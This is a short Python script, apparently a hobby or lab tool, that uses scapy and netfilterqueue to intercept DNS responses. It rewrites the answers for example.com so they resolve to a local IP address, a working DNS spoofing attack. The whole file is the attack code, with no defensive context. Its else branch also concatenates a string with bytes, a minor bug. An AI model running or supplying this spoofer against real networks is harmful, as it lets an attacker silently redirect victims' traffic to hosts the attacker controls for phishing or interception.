#!/usr/bin/python3.8

import scapy.all as scapy
from netfilterqueue import NetfilterQueue


dns_hosts = {
    b"www.example.com.": "192.168.1.186",
    b"example.com.": "192.168.1.186"
}


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if qname in dns_hosts:
            print("[Before]:" + scapy_packet.summary(0)),
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            print("[After ]:" + scapy_packet.summary(0))
        else:
            print("no modification: " + qname)
    packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
